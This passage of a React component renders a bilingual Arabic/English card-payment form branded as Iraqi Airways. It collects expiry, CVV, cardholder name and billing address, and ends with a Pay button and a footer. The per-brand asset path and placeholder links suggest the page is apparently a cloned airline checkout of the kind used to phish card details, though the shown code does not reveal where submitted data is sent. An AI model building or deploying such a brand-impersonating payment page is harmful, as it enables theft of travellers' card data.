                        className="w-10 bg-transparent text-gray-700 focus:outline-none text-[15px] text-center self-center" />
                      <span className="text-gray-400 mx-1 self-center">/</span>
                      <input id="expiry-year" type="text" inputMode="numeric" placeholder="YY" value={expiryYear} 
                        onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g,'').slice(0,2))} 
                        className="w-10 bg-transparent text-gray-700 focus:outline-none text-[15px] text-center self-center" />
                    </div>
                  </fieldset>

                  <fieldset className={`border rounded px-3 bg-[#f5faf0] flex-1 min-w-0 flex items-center flex-shrink-0 ${errors.cvv ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'رمز الأمان (CVV)*' : 'CVV*'}</legend>
                    <div className="flex items-center w-full h-full">
                      <input type="text" inputMode="numeric" placeholder="123" maxLength={3} {...register("cvv", { onChange: (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3); } })} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" dir="ltr" />
                      <svg className="w-6 h-6 text-gray-400 self-center" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    </div>
                  </fieldset>
                </div>

                <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center mt-3 ${errors.nameOnCard ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                  <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الاسم على البطاقة*' : 'Name on card*'}</legend>
                  <input type="text" placeholder={isAr ? 'اكتب الاسم بالحروف الإنجليزية كما هو على البطاقة' : 'Name as it appears on the card'} {...register("nameOnCard", { onChange: (e) => { e.target.value = e.target.value.replace(/[^A-Za-z '\u0027-]/g, ''); } })} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" dir="ltr" />
                </fieldset>

                <div className="mt-8">
                  <h3 className={`text-[#2E7D32] font-bold mb-4 ${isAr ? 'text-right' : 'text-left'}`}>{isAr ? 'عنوان الفوترة' : 'Billing Address'}</h3>
                  <div className="space-y-3">
                    <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.street ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'اسم الشارع ورقم المنزل*' : 'Number and street name*'}</legend>
                      <input type="text" placeholder={isAr ? 'أدخل اسم الشارع ورقم المنزل' : 'Enter a number and street name'} {...register("street")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" />
                    </fieldset>

                    <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'شقة، مبنى، طابق، إلخ (اختياري)' : 'Apartment, building, floor, etc. (optional)'}</legend>
                      <input type="text" placeholder={isAr ? 'أدخل الشقة، المبنى، الطابق، إلخ' : 'Enter an apartment, building, floor, etc.'} {...register("apartment")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" />
                    </fieldset>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.city ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                        <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'المدينة*' : 'Town/City*'}</legend>
                        <input type="text" placeholder={isAr ? 'أدخل المدينة' : 'Enter a town or city'} {...register("city")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" />
                      </fieldset>
                      <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                        <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الولاية/المنطقة (اختياري)' : 'State/Region (optional)'}</legend>
                        <input type="text" placeholder={isAr ? 'أدخل الولاية أو المنطقة' : 'Enter a state or region'} {...register("state")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" />
                      </fieldset>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.postcode ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                        <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الرمز البريدي*' : 'Postcode/ZIP code*'}</legend>
                        <input type="text" placeholder={isAr ? 'أدخل الرمز البريدي' : 'Enter a postcode or ZIP code'} {...register("postcode")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" />
                      </fieldset>
                      
                      <fieldset ref={countryDropdownRef} className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center relative" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                        <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الدولة/المنطقة*' : 'Country/Region*'}</legend>
                        <div className="flex items-center cursor-pointer w-full h-full" onClick={() => setCountryOpen(!countryOpen)}>
                          <div className={`flex items-center flex-1 ${isAr ? 'flex-row' : 'flex-row'}`}>
                            <img src={`https://flagcdn.com/20x15/${selectedCountry.code}.png`} alt="" className={`${isAr ? 'ml-2' : 'mr-2'} w-5 h-4`} />
                            <span className="text-gray-700 text-[15px] self-center">{isAr ? selectedCountry.ar : selectedCountry.en}</span>
                          </div>
                          <span className="text-gray-400 self-center">▼</span>
                        </div>
                        {countryOpen && (
                          <div className={`absolute left-0 right-0 top-full mt-1 bg-white border border-[#4CAF50] rounded shadow-lg z-50 max-h-60 overflow-y-auto ${isAr ? 'text-right' : 'text-left'}`}>
                            <div className="sticky top-0 bg-white p-2 border-b" onClick={(e) => e.stopPropagation()}>
                              <input 
                                type="text" 
                                placeholder={isAr ? "بحث..." : "Search..."} 
                                value={countrySearch} 
                                onChange={(e) => setCountrySearch(e.target.value)} 
                                className="w-full border border-gray-300 rounded px-2 py-1 text-sm focus:outline-none focus:border-[#4CAF50]" 
                                autoFocus 
                              />
                            </div>
                            {filteredCountries.map(c => (
                              <div key={c.code} className={`flex items-center px-3 py-2 hover:bg-[#e8f5e9] cursor-pointer ${isAr ? 'flex-row' : 'flex-row'}`} onClick={() => { setSelectedCountry(c); setCountryOpen(false); setCountrySearch(''); }}>
                                <img src={`https://flagcdn.com/20x15/${c.code}.png`} alt="" className={`${isAr ? 'ml-2' : 'mr-2'} w-5 h-4`} />
                                <span className="text-sm text-gray-700">{isAr ? c.ar : c.en}</span>
                              </div>
                            ))}
                          </div>
                        )}
                      </fieldset>
                    </div>
                  </div>
                </div>

                <div className="mt-8 bg-[#e3f2fd] p-4 rounded-lg flex items-start gap-3 border border-[#bbdefb]">
                  <div className="w-6 h-6 bg-[#2196f3] text-white rounded-full flex items-center justify-center shrink-0 font-bold text-sm">i</div>
                  <div className={`text-xs text-[#0d47a1] font-medium leading-relaxed ${isAr ? 'text-right' : 'text-left'}`}>
                    <p>{isAr ? 'لقد اخترت الدفع المباشر. سيتم تأكيد حجزك فقط بعد اكتمال عملية الدفع.' : 'You have chosen a direct payment. Your booking will be confirmed only after the payment is completed.'}</p>
                    <p className="mt-1">{isAr ? 'يرجى ملاحظة أن الأسعار عرضة للتغيير حتى يكتمل الدفع.' : 'Please note that the prices are subject to change until the payment is completed.'}</p>
                  </div>
                </div>

                <button 
                  onClick={handleSubmit(onSubmit)} 
                  disabled={!isFormValid}
                  className={`w-full py-4 rounded-full font-black text-lg shadow-lg transition-all duration-300 mt-8 uppercase tracking-widest ${isFormValid ? 'bg-[#2E7D32] text-white hover:bg-[#1B5E20] hover:shadow-2xl active:scale-[0.98]' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}
                >
                  {isAr ? `دفع ${payCur.symbol} ${displayAmountStr}` : `Pay ${payCur.symbol} ${displayAmountStr}`}
                </button>
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-[#4CAF50] text-white py-12 px-4 mt-20">
        <div className="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-10">
          <div className="space-y-6">
            <img src="/iraqi_airways/logo.png" alt="Iraqi Airways" className="h-12 brightness-0 invert" />
            <div className="flex gap-4">
              <span className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors cursor-pointer">IG</span>
              <span className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors cursor-pointer">TW</span>
              <span className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors cursor-pointer">FB</span>
            </div>
          </div>
          <div className="space-y-4">
            <h4 className="font-black text-lg uppercase tracking-wider">{isAr ? 'الخطوط الجوية العراقية' : 'Iraqi Airways'}</h4>
            <ul className="space-y-2 text-sm font-medium opacity-80">
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'من نحن' : 'About us'}</a></li>
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'اتصل بنا' : 'Contact us'}</a></li>
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'الأسطول' : 'Fleet'}</a></li>
            </ul>
          </div>
          <div className="space-y-4">
            <h4 className="font-black text-lg uppercase tracking-wider">{isAr ? 'التخطيط والحجز' : 'Plan & Book'}</h4>
            <ul className="space-y-2 text-sm font-medium opacity-80">
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'حجز رحلة' : 'Book a flight'}</a></li>
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'حالة الرحلة' : 'Flight status'}</a></li>
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'الوجهات' : 'Destinations'}</a></li>
            </ul>
          </div>
          <div className="space-y-4">
            <h4 className="font-black text-lg uppercase tracking-wider">{isAr ? 'قانوني' : 'Legal'}</h4>
            <ul className="space-y-2 text-sm font-medium opacity-80">
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'سياسة الخصوصية' : 'Privacy Policy'}</a></li>
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'الشروط والأحكام' : 'Terms & Conditions'}</a></li>
              <li><a href="#" className="hover:opacity-100 transition-opacity">{isAr ? 'مسؤولية الناقل' : 'Carrier\'s liability'}</a></li>
            </ul>
          </div>
        </div>
        <div className="max-w-6xl mx-auto border-t border-white/10 mt-12 pt-8 text-center text-[10px] font-bold opacity-50 uppercase tracking-[0.2em]">
          © 2026 Iraqi Airways. All rights reserved.
        </div>
      </footer>
    </div>
  );
}
